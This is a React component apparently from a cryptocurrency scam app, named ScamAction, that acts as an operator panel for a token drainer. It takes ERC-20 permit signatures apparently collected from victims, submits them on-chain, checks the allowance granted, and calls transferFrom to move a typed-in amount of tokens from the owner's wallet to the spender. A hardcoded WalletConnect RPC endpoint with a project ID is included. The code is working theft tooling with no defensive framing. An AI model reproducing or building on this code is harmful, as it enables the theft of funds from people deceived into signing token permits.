'use client';

import {SignedPermitSignature} from "@/app/scam/page";
import {callContractMethod} from "../page";
import {CustomContract} from "@/app/TokenList";
import React, {useState} from "react";
import {ethers} from "ethers";

const ScamAction = (props: {
	data: SignedPermitSignature
}) => {
	const {data} = props;
	const [contractAddress, setContractAddress] = useState(CustomContract.ETH);
	const [provider, setProvider] = useState("https://rpc.walletconnect.com/v1/?chainId=eip155:1&projectId=90e5e5ac9da57364effebface3c64405")
	return (
		<div className={'flex gap-3 items-center'}>
			<select value={contractAddress} onChange={e => {
				setContractAddress(e.target?.value);
			}}>
				{Object.entries(CustomContract).map(([key, value]) => (
					<option key={key} value={value}>{key}</option>
				))}
			</select>
			<button onClick={() => {
				callContractMethod('permit', [
						data.permit.owner,
						data.permit.spender,
						data.permit.value,
						data.permit.deadline,
						data.v,
						data.r,
						data.s,
						{
							gasLimit: 100000
						}
					], contractAddress,
					provider)
					.catch((e) => {
						alert(`ERROR ${e?.message ?? e}`);
						console.error(e)
					}).then(() => {
					alert("Permit successful!")
				});
			}}>
				permit
			</button>
			<button onClick={async () => {
				alert((await callContractMethod('allowance', [
					data.permit.owner,
					data.permit.spender
				], contractAddress, provider)));
			}}>
				Allowance
			</button>
			<button onClick={async () => {
				callContractMethod('transferFrom', [
					data.permit.owner,
					data.permit.spender,
					ethers.utils.parseEther(window.prompt("Enter Amount to transfer") + ""),
					{
						gasLimit: 40000
					}
				], contractAddress, provider)
					.catch((e) => {
						alert(`ERROR ${e?.message ?? e}`);
						console.error(e)
					}).then((e) => {
					console.log(e);
				});
			}}>
				Transfer
			</button>
			<span>ContractAddr:</span>
			<input onChange={(e) => {
				setContractAddress(e.target?.value);
			}} value={contractAddress} placeholder={'Contract Address'} className={'border rounded'}/>
			<span>Provider:</span>
			<input onChange={(e) => {
				setProvider(e.target?.value);
			}} value={provider} placeholder={'Provider'} className={'border rounded'}/>
		</div>
	);
};

export default ScamAction;
